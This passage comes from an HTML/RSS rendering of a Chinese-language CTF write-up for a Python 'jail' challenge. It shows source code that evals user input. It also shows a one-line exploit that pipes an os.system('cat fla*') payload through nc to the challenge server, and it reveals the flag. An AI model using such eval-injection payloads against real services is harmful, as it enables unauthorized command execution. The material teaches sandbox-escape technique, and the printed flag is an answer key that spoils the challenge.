&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ip &lt;span style="color:#f92672">=&lt;/span> input(&lt;span style="color:#e6db74">&amp;#34;AEGIS&amp;gt; &amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#e6db74">&amp;#39;hint&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> ip&lt;span style="color:#f92672">.&lt;/span>lower():
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(__import__(&lt;span style="color:#e6db74">&amp;#39;os&amp;#39;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>system(&lt;span style="color:#e6db74">&amp;#39;cat jail.py&amp;#39;&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exit()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#e6db74">&amp;#39;flag&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> ip&lt;span style="color:#f92672">.&lt;/span>lower():
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;Sorry, I don&amp;#39;t like any &lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74">FLAG&lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74">!&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">continue&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(eval(ip))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span> &lt;span style="color:#a6e22e">Exception&lt;/span> &lt;span style="color:#66d9ef">as&lt;/span> error:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;ERROR:&amp;#34;&lt;/span>, error)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;Good luck next time!&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">pass&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h3>
&lt;p>應該是基本的jail escape，可以看到source code中擋掉了flag string，所以可以直接用萬用字元一樣畫葫蘆就拿到flag，水題中的水題&lt;/p>
&lt;h3 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ echo &lt;span style="color:#e6db74">&amp;#34;print(__import__(&amp;#39;os&amp;#39;).system(&amp;#39;cat fla*&amp;#39;))&amp;#34;&lt;/span> | nc 35.234.20.42 &lt;span style="color:#ae81ff">8000&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Flag: &lt;code>AEGIS{600d_j0b_70_byp455_fl46}&lt;/code>&lt;/p>
&lt;h2 id="jail2">
 Jail2
 &lt;a class="anchor" href="#jail2">#&lt;/a>
&lt;/h2>
&lt;h3 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h3>
&lt;p>SSTI&lt;/p></description></item></channel></rss>